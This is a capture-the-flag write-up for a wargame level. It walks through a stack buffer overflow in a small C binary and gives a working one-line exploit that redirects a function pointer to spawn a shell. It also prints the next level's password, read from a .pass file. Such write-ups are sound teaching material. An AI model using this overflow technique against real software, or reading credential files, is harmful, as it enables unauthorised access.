# Level 03

In this level, is provided to us a binary at ***/levels/level03***, it's about a simple Buffer Overflow exploration, take a look at his code:

```c
#include <stdio.h>
#include <string.h>

void good()
{
        puts("Win.");
        execl("/bin/sh", "sh", NULL);
}
void bad()
{
        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
        void (*functionpointer)(void) = bad;
        char buffer[50];

        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;

        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4);

        printf("This is exciting we're going to %p\n", functionpointer);
        functionpointer();

        return 0;
}
```

## Analysing the flaw
First it's created a function pointer that holds the bad function address, 
the wrong one, then it's created a buffer with 50 bytes length.

Then our entire argv[1] input is copied to our 50 bytes buffer, and then its removed our input size minus 4 bytes.

## Exploiting

It's very simple to realized how can we reach the good function, we just need to get the padding that break the program, and then fill with the address of our good function.


If you look at the asm code, you will notice that the stack frame reserving part, allocates 0x78 -> 120 bytes, now just subs from 50 bytes and you will realize that after 4 bytes of that, because the word size is 32 bits, we will start to enter in the ***void* pointer*** address.

```
level3@io:/levels$ objdump -DM intel level03 | less
 080484c8 <main>:
 80484c8:       55                      push   ebp
 80484c9:       89 e5                   mov    ebp,esp
 80484cb:       83 ec 78                sub    esp,0x78
```

### The exploit:

```
level3@io:/levels$ ./level03 $(python -c 'print("A"*76 + "\x74")')
This is exciting we're going to 0x8048474
Win.
```

Password for level4:
```
sh-4.3$ cat /home/level4/.pass 
7WhHa5HWMNRAYl9T
```


